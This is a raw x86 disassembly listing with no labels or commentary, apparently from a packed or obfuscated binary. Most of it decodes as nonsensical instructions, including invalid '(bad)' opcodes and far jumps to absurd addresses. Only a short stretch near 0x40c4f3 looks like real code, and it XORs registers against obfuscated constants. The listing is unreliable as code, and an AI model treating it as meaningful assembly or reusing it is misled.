  40c09e:	mov    dh,0x7
  40c0a0:	arpl   WORD PTR [ecx],ax
  40c0a2:	adc    DWORD PTR [eax],ecx
  40c0a4:	dec    esp
  40c0a5:	adc    al,0xd5
  40c0a7:	jo     0x40c04f
  40c0a9:	iret   
  40c0aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0ab:	xchg   ecx,eax
  40c0ac:	dec    ebx
  40c0ad:	enter  0xf0a3,0xf7
  40c0b1:	xchg   esp,eax
  40c0b2:	(bad)  [eiz*4+0x4aa56153]
  40c0b9:	cs (bad) 
  40c0bb:	or     ch,BYTE PTR gs:[eax-0x56]
  40c0bf:	push   edx
  40c0c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0c1:	mov    ebp,0xa8393b23
  40c0c6:	imul   edi,DWORD PTR fs:[eax-0x3278625a],0xa07b2ed3
  40c0d1:	adc    esp,ebx
  40c0d3:	jmp    0x40c146
  40c0d5:	sbb    al,0x2c
  40c0d7:	pop    es
  40c0d8:	add    edi,ecx
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	ror    BYTE PTR [esp-0x7521294f],1
  40c0f3:	jle    0x40c173
  40c0f5:	jo     0x40c170
  40c0f7:	jle    0x40c177
  40c0f9:	aam    0xfd
  40c0fb:	push   eax
  40c0fc:	stos   DWORD PTR es:[edi],eax
  40c0fd:	mov    dl,0xb9
  40c0ff:	jns    0x40c147
  40c101:	xchg   ecx,eax
  40c102:	pop    ss
  40c103:	xchg   esi,eax
  40c104:	test   ecx,0x1de97bbf
  40c10a:	int3   
  40c10b:	push   ebp
  40c10c:	(bad)  
  40c10d:	out    dx,eax
  40c10e:	test   eax,0x8cda1c98
  40c113:	inc    ebx
  40c114:	xchg   BYTE PTR [edi+edx*1+0x1a2bc7ff],al
  40c11b:	fwait
  40c11c:	push   ds
  40c11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c11e:	push   esp
  40c11f:	mov    ecx,0xc7a4db0d
  40c124:	test   eax,0x84381657
  40c129:	jl     0x40c0d8
  40c12b:	and    eax,0x908257f9
  40c130:	pop    esi
  40c131:	pop    DWORD PTR [eax+0x19]
  40c134:	imul   eax,DWORD PTR [eax-0x299156bd],0xa6105fff
  40c13e:	xchg   DWORD PTR [ebp+0x11],esp
  40c141:	xchg   ebx,eax
  40c142:	pop    ecx
  40c143:	idiv   DWORD PTR [ebx+edi*4-0x26]
  40c147:	sbb    ecx,ecx
  40c149:	aaa    
  40c14a:	das    
  40c14b:	xchg   ebx,eax
  40c14c:	repnz nop
  40c14e:	rcl    DWORD PTR [esp+eax*2],0x56
  40c152:	nop
  40c153:	mov    ch,0x9b
  40c155:	or     eax,0x79f61943
  40c15a:	adc    al,0xca
  40c15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c15d:	imul   edi,DWORD PTR [eax],0x27
  40c160:	sbb    cl,BYTE PTR [esi+0x7278cc33]
  40c166:	sahf   
  40c167:	xor    ecx,DWORD PTR [esi+0x29]
  40c16a:	dec    edx
  40c16b:	mov    DWORD PTR [esi],edx
  40c16d:	jg     0x40c137
  40c16f:	and    eax,0x9f3c3b85
  40c174:	stos   DWORD PTR es:[edi],eax
  40c175:	cmp    al,cl
  40c177:	sbb    DWORD PTR [ecx],edx
  40c179:	push   es
  40c17a:	xchg   ecx,eax
  40c17b:	sbb    DWORD PTR ds:0xdf991d92,edx
  40c181:	mov    WORD PTR [edx+0x9],cs
  40c184:	call   0xbbab:0xe39235b8
  40c18b:	outs   dx,BYTE PTR ds:[esi]
  40c18c:	stc    
  40c18d:	mov    ebp,0xdfeb7524
  40c192:	push   ecx
  40c193:	fdiv   st(7),st
  40c195:	mov    ebp,0xd1bfec37
  40c19a:	ror    DWORD PTR [edi],1
  40c19c:	ret    
  40c19d:	mov    BYTE PTR [ebp+0x3a9d942e],al
  40c1a3:	jnp    0x40c1df
  40c1a5:	test   DWORD PTR [edi],edi
  40c1a7:	test   BYTE PTR [ecx-0x71aa31fb],dl
  40c1ad:	je     0x40c220
  40c1af:	jmp    0xd0f2:0xb58b69bc
  40c1b6:	cli    
  40c1b7:	hlt    
  40c1b8:	inc    edx
  40c1b9:	scas   eax,DWORD PTR es:[edi]
  40c1ba:	jns    0x40c22e
  40c1bc:	test   BYTE PTR [ebx+ebp*4+0x47],dl
  40c1c0:	mov    eax,ds:0x13331930
  40c1c5:	(bad)  
  40c1c6:	rcl    DWORD PTR [ebp-0x62],1
  40c1c9:	hlt    
  40c1ca:	jo     0x40c1c5
  40c1cc:	and    ebp,DWORD PTR [ebp+0x5a737de9]
  40c1d2:	mov    dh,0x35
  40c1d4:	sahf   
  40c1d5:	clc    
  40c1d6:	push   ecx
  40c1d7:	je     0x40c1fd
  40c1d9:	int    0xb8
  40c1db:	jmp    0x748b:0xfed3edc4
  40c1e2:	fisubr DWORD PTR [ebx-0x52]
  40c1e5:	jbe    0x40c190
  40c1e7:	test   eax,0x9a642d7d
  40c1ec:	(bad)  
  40c1ed:	jns    0x40c262
  40c1ef:	mov    al,0x0
  40c1f1:	inc    ecx
  40c1f2:	cmp    DWORD PTR [esi],eax
  40c1f4:	sbb    al,0x87
  40c1f6:	sbb    al,0x19
  40c1f8:	pop    ss
  40c1f9:	jae    0x40c1ef
  40c1fb:	int    0x77
  40c1fd:	jp     0x40c21a
  40c1ff:	pop    ds
  40c200:	stos   DWORD PTR es:[edi],eax
  40c201:	int3   
  40c202:	inc    ebp
  40c203:	dec    ebx
  40c204:	pop    esp
  40c205:	into   
  40c206:	and    BYTE PTR [ebx+0x1d83cb49],al
  40c20c:	inc    ecx
  40c20d:	xchg   edi,eax
  40c20e:	and    eax,0x3ec0394
  40c213:	fstp   TBYTE PTR [edx-0xe]
  40c216:	test   al,0xcd
  40c218:	ss hlt 
  40c21a:	pop    edx
  40c21c:	push   eax
  40c21d:	sub    ah,BYTE PTR [esi+0x17ce7aa5]
  40c223:	fld    TBYTE PTR [ebp-0x59]
  40c226:	cmp    DWORD PTR [edi-0x46],ebx
  40c229:	pop    ecx
  40c22a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c22b:	js     0x40c27b
  40c22d:	retf   0x7c82
  40c230:	mov    bl,0x7
  40c232:	and    DWORD PTR [ebp-0xf],edi
  40c235:	cli    
  40c236:	mov    edi,0xa7ee4833
  40c23b:	and    DWORD PTR ds:0x2807c4ee,esi
  40c241:	ret    0x32bb
  40c244:	daa    
  40c245:	add    BYTE PTR [esi+0x26],al
  40c248:	dec    ebp
  40c249:	scas   al,BYTE PTR es:[edi]
  40c24a:	xor    DWORD PTR [esi-0x5f],eax
  40c24d:	mov    ds:0xcd8a76ef,al
  40c252:	or     BYTE PTR fs:[esi-0x3dea25f0],dh
  40c259:	aas    
  40c25a:	repnz adc BYTE PTR [ebx+0x2dfe464c],bl
  40c261:	out    dx,al
  40c262:	sar    DWORD PTR [edx],0xdf
  40c265:	nop
  40c266:	dec    esp
  40c267:	mov    ds:0x26e8fd53,al
  40c26c:	lds    esi,FWORD PTR [eax]
  40c26e:	dec    edi
  40c26f:	xlat   BYTE PTR ds:[ebx]
  40c270:	outs   dx,DWORD PTR ds:[esi]
  40c271:	jecxz  0x40c2cc
  40c273:	xchg   edx,eax
  40c274:	es js  0x40c23a
  40c277:	retf   
  40c278:	stos   DWORD PTR es:[edi],eax
  40c279:	sbb    edx,DWORD PTR [eax-0x6cc2a3d1]
  40c27f:	xchg   edx,eax
  40c280:	les    esp,FWORD PTR [edi+edi*4+0xbb2e5a4]
  40c287:	(bad)  
  40c288:	sahf   
  40c289:	jle    0x40c226
  40c28b:	add    dh,dl
  40c28d:	jmp    0xb63d379e
  40c292:	inc    ebp
  40c293:	inc    ebx
  40c294:	mov    edx,0x5d06d00e
  40c299:	call   0x42194035
  40c29e:	mov    eax,0x2bb16cba
  40c2a3:	xor    edi,edi
  40c2a5:	jl     0x40c227
  40c2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2a8:	stos   DWORD PTR es:[edi],eax
  40c2a9:	and    al,0xe2
  40c2ab:	popf   
  40c2ac:	sbb    bh,BYTE PTR [edi+0x54]
  40c2af:	sub    ebx,eax
  40c2b1:	jg     0x40c310
  40c2b3:	mov    BYTE PTR [edx-0x64f9145d],bl
  40c2b9:	push   ds
  40c2ba:	lea    eax,[esi-0x36]
  40c2bd:	sub    edi,DWORD PTR ds:0x7ff70866
  40c2c3:	and    ebx,DWORD PTR es:[eax+ebx*1-0x4]
  40c2c8:	into   
  40c2c9:	push   0xeed4cc4a
  40c2ce:	inc    eax
  40c2cf:	dec    BYTE PTR [esp+esi*1-0x4b]
  40c2d3:	gs cld 
  40c2d5:	xor    eax,DWORD PTR [ebx-0x716aa638]
  40c2db:	out    0x20,eax
  40c2dd:	xchg   ch,bh
  40c2df:	inc    ebp
  40c2e0:	or     ebx,DWORD PTR [edi]
  40c2e2:	rcl    DWORD PTR [edx-0x4c53a348],1
  40c2e8:	push   ebx
  40c2e9:	jo     0x40c274
  40c2eb:	and    eax,0x88b0d19e
  40c2f0:	test   bl,bh
  40c2f2:	fstp   QWORD PTR [edx+edi*8-0x4a11b997]
  40c2f9:	aad    0x5
  40c2fb:	scas   al,BYTE PTR es:[edi]
  40c2fc:	imul   esp,DWORD PTR [edx+0x51],0x16af0fbe
  40c303:	je     0x40c2c4
  40c305:	dec    edx
  40c306:	push   esi
  40c307:	(bad)  
  40c308:	out    dx,al
  40c309:	sbb    BYTE PTR [esi-0xf3110c],dh
  40c30f:	(bad)  
  40c310:	sub    BYTE PTR [esi+0x3c162b91],al
  40c316:	jge    0x9e4f435f
  40c31c:	(bad)  
  40c31e:	daa    
  40c31f:	adc    al,0xba
  40c321:	imul   esp,DWORD PTR [ecx+ecx*4+0xe],0xf
  40c326:	inc    esi
  40c327:	icebp  
  40c328:	(bad)  
  40c329:	retf   
  40c32a:	xchg   ecx,eax
  40c32b:	jbe    0x40c39f
  40c32d:	icebp  
  40c32e:	movhps QWORD PTR [ecx-0x4b769fd5],xmm0
  40c335:	fidivr WORD PTR [esi]
  40c337:	add    BYTE PTR [esi],dh
  40c339:	adc    edx,0x98f0f433
  40c33f:	ror    BYTE PTR [esi+eax*4-0x6],0x37
  40c344:	lds    esp,FWORD PTR [ecx-0x18]
  40c347:	pop    ebp
  40c348:	dec    eax
  40c349:	sbb    edi,0xffffffac
  40c34c:	or     ecx,DWORD PTR [ebp-0x1cea58b9]
  40c352:	cmp    eax,DWORD PTR [edi+esi*8]
  40c355:	test   al,0xc8
  40c357:	sub    al,0x2
  40c359:	sub    eax,0x35d70cca
  40c35e:	lds    esi,FWORD PTR [ecx]
  40c360:	pusha  
  40c361:	cwde   
  40c362:	jle    0x40c3b0
  40c364:	cld    
  40c365:	jb     0x40c33c
  40c367:	dec    ebp
  40c368:	clc    
  40c369:	lahf   
  40c36a:	std    
  40c36b:	mov    ecx,0x150d290c
  40c370:	and    eax,0x3509be40
  40c375:	hlt    
  40c376:	xor    eax,0xa460edb
  40c37b:	test   BYTE PTR [eax+0x65adeea1],cl
  40c381:	in     al,dx
  40c382:	mov    esp,0xe90a5866
  40c387:	and    DWORD PTR gs:[edi-0x7ce7a38e],edi
  40c38e:	push   edi
  40c38f:	cmp    ebx,DWORD PTR [edi]
  40c391:	fistp  QWORD PTR [edx-0x1b9d21cc]
  40c397:	inc    ecx
  40c398:	sahf   
  40c399:	sbb    BYTE PTR [edi+0x79246b77],al
  40c39f:	shr    BYTE PTR [edi],1
  40c3a1:	or     BYTE PTR [ecx+ebx*1+0x7db33095],dh
  40c3a8:	cmp    DWORD PTR [edx+0x36711a30],ebx
  40c3ae:	adc    edx,ebp
  40c3b0:	pop    esi
  40c3b1:	rol    bh,0xfe
  40c3b4:	push   0xb155c1d2
  40c3b9:	out    dx,eax
  40c3ba:	sti    
  40c3bb:	push   ebp
  40c3bc:	aaa    
  40c3bd:	aad    0xc3
  40c3bf:	xor    BYTE PTR [ebx],dl
  40c3c1:	adc    eax,edi
  40c3c3:	mov    dl,0xf4
  40c3c5:	mov    ah,0x1e
  40c3c7:	fisub  DWORD PTR [edi+0x32b3bdd3]
  40c3cd:	push   ds
  40c3ce:	div    BYTE PTR [edi-0x614886e1]
  40c3d4:	cmp    al,0xb4
  40c3d6:	pop    ebx
  40c3d7:	adc    eax,0xac271646
  40c3dc:	xor    DWORD PTR [eax+0x6d95658b],ebp
  40c3e2:	mov    eax,ds:0x18c4e726
  40c3e7:	shl    BYTE PTR [edx-0x5a],0x4a
  40c3eb:	aas    
  40c3ec:	jae    0x40c401
  40c3ee:	cli    
  40c3ef:	ret    0x2980
  40c3f2:	and    cl,0x27
  40c3f5:	xor    eax,0x8f77a78
  40c3fa:	push   0x1e
  40c3fc:	call   0xd15a9ab5
  40c401:	adc    eax,0x2dc72904
  40c406:	jnp    0x40c3a2
  40c408:	pop    ebx
  40c409:	dec    ebx
  40c40a:	mov    ebp,0xa9d53c46
  40c40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c410:	in     eax,0x4e
  40c412:	xor    edi,DWORD PTR [esi+0x32]
  40c415:	sbb    BYTE PTR [esp+eax*1+0x9],al
  40c419:	xchg   ebx,eax
  40c41a:	pop    ebx
  40c41b:	xchg   ebp,eax
  40c41c:	pop    esi
  40c41d:	add    ecx,DWORD PTR [edi+ebp*1+0x399d8be5]
  40c424:	out    0x68,al
  40c426:	cdq    
  40c427:	retf   0x51
  40c42a:	pusha  
  40c42b:	ffreep st(4)
  40c42d:	outs   dx,DWORD PTR ds:[esi]
  40c42e:	popf   
  40c42f:	call   0xcba7946d
  40c434:	dec    ebp
  40c435:	and    ebp,DWORD PTR [ecx-0x267f0d8b]
  40c43b:	push   esp
  40c43c:	in     al,0x4f
  40c43e:	sbb    eax,DWORD PTR [ecx]
  40c440:	or     ecx,esi
  40c442:	mov    ebx,0x214825a8
  40c447:	scas   al,BYTE PTR es:[edi]
  40c448:	(bad)  
  40c44a:	sbb    esi,ebp
  40c44c:	sbb    BYTE PTR [edi-0x2859dab5],ch
  40c452:	and    dh,0x31
  40c455:	arpl   WORD PTR [edi],ax
  40c457:	mov    bh,BYTE PTR [edx+ecx*4]
  40c45a:	fstp   TBYTE PTR [esi+0x75622c01]
  40c460:	icebp  
  40c461:	jno    0x40c4d8
  40c463:	(bad)  
  40c464:	fidiv  DWORD PTR [eax+ebx*1]
  40c467:	inc    ebx
  40c468:	imul   esi,DWORD PTR [edi-0x28882993],0x645b1bcf
  40c472:	jb     0x40c4e2
  40c474:	push   0x1d570401
  40c479:	mov    ecx,0x64fe5283
  40c47e:	xchg   edi,eax
  40c47f:	mov    al,0x5c
  40c481:	inc    esi
  40c482:	push   es
  40c483:	dec    edx
  40c484:	popf   
  40c485:	jae    0x40c498
  40c487:	pop    ebx
  40c488:	and    eax,esi
  40c48a:	cmp    BYTE PTR [ebx+eiz*8-0x3b],dl
  40c48e:	adc    BYTE PTR [ecx+0x4],ah
  40c491:	cs mov dh,0x62
  40c494:	cdq    
  40c495:	ret    
  40c496:	adc    edx,edi
  40c498:	ror    BYTE PTR [ebp-0x1c],cl
  40c49b:	aaa    
  40c49c:	add    ebx,ecx
  40c49e:	jbe    0x40c49e
  40c4a0:	xchg   ebx,eax
  40c4a1:	lds    ecx,FWORD PTR [eax+0x398120d1]
  40c4a7:	sbb    DWORD PTR [eax-0x2e],esi
  40c4aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ab:	out    dx,eax
  40c4ac:	gs std 
  40c4ae:	jnp    0x40c4bd
  40c4b0:	sub    ch,bh
  40c4b2:	paddd  mm6,QWORD PTR [ebx-0x41]
  40c4b6:	xor    eax,0xf7d1572d
  40c4bb:	adc    BYTE PTR [esi-0xdf91feb],al
  40c4c1:	mov    ah,0x6a
  40c4c3:	ss mov edi,0x2e22f5
  40c4c9:	mov    eax,0x74410f39
  40c4ce:	mov    al,ds:0xb3946ad
  40c4d3:	fcomi  st,st(3)
  40c4d5:	push   esi
  40c4d6:	mov    ecx,0xfd04405c
  40c4db:	xchg   edx,eax
  40c4dc:	jmp    0x5e8e6a65
  40c4e1:	fldenv [edx]
  40c4e3:	add    DWORD PTR [edx-0x5b331ea8],eax
  40c4e9:	retf   
  40c4ea:	xchg   edx,eax
  40c4eb:	imul   ecx,DWORD PTR [ecx+ecx*8],0xffffffa6
  40c4ef:	jns    0x40c4cf
  40c4f1:	xor    al,0x8c
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	and    ebp,DWORD PTR [esi-0x692f9903]
  40c545:	jle    0x40c5c5
  40c547:	jo     0x40c5c2
  40c549:	jle    0x40c5c9
  40c54b:	adc    bl,ch
  40c54d:	stc    
  40c54e:	adc    ebp,0x161ed2eb
  40c554:	dec    ebx
  40c555:	fwait
  40c556:	or     BYTE PTR [edi-0x1e],ah
  40c559:	test   al,0x7f
  40c55b:	mov    edi,?
  40c55d:	ret    0xda94
  40c560:	or     eax,0xc1dcce24
  40c565:	jp     0x40c545
  40c567:	out    0x4b,eax
  40c569:	mov    al,0x72
  40c56b:	comiss xmm5,xmm3
  40c56e:	hlt    
  40c56f:	xchg   BYTE PTR [ebp-0x108a08f7],bl
  40c575:	repnz test BYTE PTR [edx+edi*2-0x67ac1f89],bh
  40c57d:	or     edx,DWORD PTR [ecx+0x71]
  40c580:	push   ebp
  40c581:	fld    st(1)
  40c583:	push   0xffffff85
  40c585:	inc    eax
  40c586:	pop    eax
  40c587:	rcl    DWORD PTR [esi+esi*4+0x23],0x22
  40c58c:	outs   dx,DWORD PTR ds:[esi]
  40c58d:	sahf   
  40c58e:	jno    0x40c5fc
  40c590:	jnp    0x40c5d8
  40c592:	cmove  ecx,esp
  40c595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c596:	inc    edx
  40c597:	fnstsw WORD PTR [edx+eiz*4]
  40c59a:	dec    edi
  40c59b:	xor    al,0xe7
  40c59d:	xlat   BYTE PTR ds:[ebx]
  40c59e:	sbb    esp,0xc1354ae1
  40c5a4:	add    edi,DWORD PTR [edi]
  40c5a6:	(bad)  
  40c5a7:	sub    dh,dl
  40c5a9:	scas   eax,DWORD PTR es:[edi]
  40c5aa:	cli    
  40c5ab:	fwait
  40c5ac:	jno    0x40c5fa
  40c5ae:	jle    0x40c624
  40c5b0:	stc    
  40c5b1:	bnd ret 
  40c5b3:	xchg   DWORD PTR [ebx-0x6c],ebp
  40c5b6:	jmp    0xd33f:0xd623acde
  40c5bd:	jnp    0x40c5dc
  40c5bf:	cmp    esi,edx
  40c5c1:	or     al,0x28
  40c5c4:	lock xchg ecx,eax
  40c5c6:	or     DWORD PTR ds:0x461bd7dc,edx
  40c5cc:	cwde   
  40c5cd:	test   eax,0xb83ff3a7
  40c5d2:	xor    eax,0x6049103e
  40c5d7:	clc    
  40c5d8:	inc    ebx
  40c5d9:	mov    ebp,0x77e9e7a4
  40c5de:	sub    dl,bl
  40c5e0:	cdq    
  40c5e1:	or     al,BYTE PTR [edi]
  40c5e3:	int3   
  40c5e4:	mov    dh,0xa7
  40c5e6:	pop    ss
  40c5e7:	jecxz  0x40c5b5
  40c5e9:	mov    esp,0x6a36a0fa
  40c5ee:	loope  0x40c589
  40c5f0:	outs   dx,BYTE PTR ds:[esi]
  40c5f1:	xor    al,BYTE PTR [ecx]
  40c5f3:	imul   edx,DWORD PTR [edi-0x22],0xffffffeb
  40c5f7:	aaa    
  40c5f8:	inc    esi
  40c5f9:	and    al,BYTE PTR [ebx+0x77d7b548]
  40c5ff:	jg     0x40c5d3
  40c601:	sub    eax,0x1d0f19cf
  40c606:	push   0x4a30fa66
  40c60b:	jmp    0x40c668
  40c60d:	stc    
  40c60e:	es and al,0xcc
  40c611:	mov    cl,0xa9
  40c613:	(bad)  
  40c614:	jl     0x40c5b0
  40c616:	dec    BYTE PTR [ebx-0x65a9d3a6]
  40c61c:	dec    esp
  40c61d:	fiadd  DWORD PTR [ecx+0x77]
  40c620:	call   0xa625:0x923e15d9
  40c627:	xor    al,0xe9
  40c629:	mov    ah,0xd8
  40c62b:	(bad)  
  40c62c:	(bad)  
  40c62d:	adc    dh,dl
  40c62f:	jmp    0xb20e35d4
  40c634:	xchg   ecx,eax
  40c635:	mov    eax,DWORD PTR [esi]
  40c637:	pushf  
  40c638:	imul   ebx,DWORD PTR ds:[ebx-0x6d],0x40
  40c63d:	dec    eax
  40c63e:	and    ecx,esi
  40c640:	xchg   ebx,eax
  40c641:	pop    ds
  40c642:	ret    
  40c643:	pop    ebx
  40c644:	pop    edx
  40c645:	or     al,0x27
  40c647:	in     eax,0x3f
  40c649:	mov    edi,ebx
  40c64b:	mov    esi,0x22a5260c
  40c650:	popf   
  40c651:	imul   eax,DWORD PTR [eax+0x30],0xffffffc4
  40c655:	out    dx,eax
  40c656:	sbb    eax,0x80d65b0e
  40c65b:	pop    ebx
  40c65c:	sub    al,0xf5
  40c65e:	rol    DWORD PTR [esi],0x81
  40c661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c662:	cmp    esp,DWORD PTR [eax]
  40c664:	iret   
  40c665:	dec    ecx
  40c666:	push   edi
  40c667:	loope  0x40c6ca
  40c669:	dec    eax
  40c66a:	ret    0xcda3
  40c66d:	jne    0x40c6e2
  40c66f:	mov    al,0x63
  40c671:	xchg   ebp,eax
  40c672:	daa    
  40c673:	test   al,0xfe
  40c675:	mov    al,ds:0xde6afa3f
  40c67a:	xor    DWORD PTR ds:0xa4c4a6c6,0xffffffb1
  40c681:	aaa    
  40c682:	sar    bh,1
  40c684:	jns    0x40c68e
  40c686:	out    0x7d,eax
  40c688:	xchg   edi,eax
  40c689:	and    al,0xfc
  40c68b:	mov    al,0x4e
  40c68d:	lock pop eax
  40c68f:	pop    es
  40c690:	or     BYTE PTR [edi+0x71],ch
  40c693:	mov    al,ah
  40c695:	out    0x2e,al
  40c697:	ins    BYTE PTR es:[edi],dx
  40c698:	jge    0x40c666
  40c69a:	xchg   ebx,eax
  40c69b:	add    BYTE PTR [edi+0x3696d2a8],dl
  40c6a1:	rcl    DWORD PTR [esi+edx*4],cl
  40c6a4:	pop    ebx
  40c6a5:	xchg   DWORD PTR [edx],ebp
  40c6a7:	out    0xbd,al
  40c6a9:	repz push es
  40c6ab:	sti    
  40c6ac:	mov    dl,ah
  40c6ae:	in     eax,0x2a
  40c6b0:	xor    cl,BYTE PTR [eax+0x52]
  40c6b3:	iret   
  40c6b4:	cmc    
  40c6b5:	jns    0x40c6e5
  40c6b7:	mov    ?,WORD PTR [eax+0x3b]
  40c6ba:	dec    BYTE PTR [ecx-0x19]
  40c6bd:	fbld   TBYTE PTR ds:0xced15127
  40c6c3:	sub    esi,ebx
  40c6c5:	jno    0x40c6b7
  40c6c7:	add    ecx,DWORD PTR [esi+0x55]
  40c6ca:	out    0x7d,al
  40c6cc:	aam    0xe
  40c6ce:	jl     0x40c6c7
  40c6d0:	and    DWORD PTR [eax+0x29],esi
  40c6d3:	push   ebp
  40c6d4:	xchg   edx,eax
  40c6d5:	fdivrp st(1),st
  40c6d7:	jp     0x40c6f3
  40c6d9:	hlt    
  40c6da:	int3   
  40c6db:	lea    esi,[eax+0x3a491618]
  40c6e1:	pop    esi
  40c6e2:	stos   DWORD PTR es:[edi],eax
  40c6e3:	cmp    DWORD PTR [edx+0x3d],edi
  40c6e6:	xlat   BYTE PTR ds:[ebx]
  40c6e7:	push   DWORD PTR [ebp+ebp*2-0xc]
  40c6eb:	mov    ebp,ebp
  40c6ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6ee:	inc    ebx
  40c6ef:	and    al,0x41
  40c6f1:	and    ch,BYTE PTR [esi+0x6a]
  40c6f4:	push   esp
  40c6f5:	inc    eax
  40c6f6:	push   ecx
  40c6f7:	jmp    0x270b:0x2b368dd6
  40c6fe:	jb     0x40c76d
  40c700:	rcl    DWORD PTR [ecx+0x5742ce90],0xd4
  40c707:	xor    dl,BYTE PTR [edx]
  40c709:	mov    esp,DWORD PTR [edi-0x383025a3]
  40c70f:	aad    0x1d
  40c711:	hlt    
  40c712:	mov    ss,WORD PTR ds:0xed7baa6d
  40c718:	fst    QWORD PTR [edi+0x48c43d6c]
  40c71e:	inc    edx
  40c71f:	dec    ecx
  40c720:	mov    ah,0x13
  40c722:	(bad)  
  40c723:	push   ds
  40c724:	cdq    
  40c725:	hlt    
  40c726:	in     eax,dx
  40c727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c728:	retf   0x6d7f
  40c72b:	jmp    0x7749:0xcdcaf489
  40c732:	jnp    0x40c6c4
  40c734:	sub    al,0x36
  40c737:	dec    ebp
  40c738:	or     al,0xfa
  40c73a:	mov    bl,0x20
  40c73c:	inc    esi
  40c73d:	loope  0x40c72b
  40c73f:	sbb    BYTE PTR [eax-0x10],0x65
  40c743:	and    DWORD PTR ds:[edx+0x1f],esi
  40c747:	xor    ecx,DWORD PTR [edx+0x329954ca]
  40c74d:	jge    0x40c728
  40c74f:	mov    ch,0x70
  40c751:	pop    ebx
  40c752:	jo     0x40c7b8
  40c754:	ficomp DWORD PTR gs:[ecx-0x5f]
  40c758:	fidiv  WORD PTR [edx-0x6a]
  40c75b:	push   ss
  40c75c:	xor    DWORD PTR [ebx-0x1],eax
  40c75f:	fwait
  40c760:	sbb    eax,esi
  40c762:	fnstenv [edx+0x710177c4]
  40c768:	je     0x40c72b
  40c76a:	cmc    
  40c76b:	pop    edi
  40c76c:	stos   DWORD PTR es:[edi],eax
  40c76d:	sub    edi,DWORD PTR [ebx]
  40c76f:	and    ah,BYTE PTR [ebx+0x58]
  40c772:	hlt    
  40c773:	int    0x1d
  40c775:	sub    DWORD PTR [eax],0xfaa96672
  40c77b:	dec    edx
  40c77c:	arpl   WORD PTR [edx*4+0x4e885457],si
  40c783:	jmp    DWORD PTR [edx+0x16641ca5]
  40c789:	es jns 0x40c759
  40c78c:	sbb    al,0x54
  40c78e:	or     eax,0x84e794b9
  40c793:	out    0x0,al
  40c795:	(bad)  
  40c796:	repz in al,dx
  40c798:	out    0x80,eax
  40c79a:	and    eax,0x1774ac90
  40c79f:	out    dx,al
  40c7a0:	jno    0x40c75a
  40c7a2:	or     DWORD PTR [edx-0x34],esp
  40c7a5:	outs   dx,DWORD PTR ds:[esi]
  40c7a6:	push   cs
  40c7a7:	sbb    DWORD PTR [eax-0x1751f3a9],esi
  40c7ad:	and    eax,0x23acde63
  40c7b2:	js     0x40c7df
  40c7b4:	out    dx,eax
  40c7b5:	dec    edi
  40c7b6:	xor    dl,0xbc
  40c7b9:	test   BYTE PTR [ecx],ah
  40c7bb:	ja     0x40c7ee
  40c7bd:	(bad)  
  40c7be:	cmp    edx,DWORD PTR [edx]
  40c7c0:	sbb    BYTE PTR [ebx],bl
  40c7c2:	mov    dh,0x97
  40c7c4:	xchg   al,dl
  40c7c6:	xchg   BYTE PTR [esi+ecx*1],bh
  40c7c9:	push   esp
  40c7ca:	repnz int 0x98
  40c7cd:	sbb    ebx,DWORD PTR [esi]
  40c7cf:	xchg   edi,eax
  40c7d0:	adc    BYTE PTR [eax+0x32146fcc],bl
  40c7d6:	sbb    BYTE PTR [ecx],bh
  40c7d8:	add    BYTE PTR [ecx+0x25a230e0],ch
  40c7de:	jnp    0x40c80f
  40c7e0:	inc    esp
  40c7e1:	inc    eax
  40c7e2:	imul   edi,edi,0xffffffdd
  40c7e5:	popf   
  40c7e6:	jne    0x40c7e5
  40c7e8:	cmp    BYTE PTR [esi-0x1c],dh
  40c7eb:	mov    bh,0x49
  40c7ed:	or     ebp,DWORD PTR [ebp+0x4ced38d9]
  40c7f3:	jnp    0x40c7cb
  40c7f5:	mov    esi,DWORD PTR [esi]
  40c7f7:	push   ss
  40c7f8:	sbb    eax,0x61d108b3
  40c7fd:	mov    al,0xd7
  40c7ff:	push   ebp
  40c800:	icebp  
  40c801:	mov    ds:0xa3c1c394,eax
  40c806:	jecxz  0x40c812
  40c808:	(bad)  
  40c809:	scas   eax,DWORD PTR es:[edi]
  40c80a:	jp     0x40c830
  40c80c:	pop    ebp
  40c80d:	jbe    0x40c860
  40c80f:	pusha  
  40c810:	loope  0x40c838
  40c812:	xor    al,BYTE PTR [esi]
  40c814:	fadd   QWORD PTR [eax-0x9]
  40c817:	jl     0x40c873
  40c819:	enter  0x4cd3,0x68
  40c81d:	fwait
  40c81e:	sub    cl,BYTE PTR [ecx+edx*4-0x1bd30f18]
  40c825:	push   ecx
